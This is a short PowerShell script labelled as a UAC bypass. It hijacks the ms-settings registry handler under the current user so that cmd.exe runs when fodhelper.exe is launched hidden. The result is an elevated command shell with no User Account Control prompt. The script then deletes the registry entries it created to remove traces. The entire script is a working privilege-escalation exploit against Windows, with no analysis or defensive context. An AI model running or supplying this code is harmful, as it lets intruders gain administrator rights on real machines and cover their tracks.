#UAC-Bypass script

$krish = "C:\Windows\System32\cmd.exe"

New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $krish -Force

Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden

#Cleaning & Removing the entries created.
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
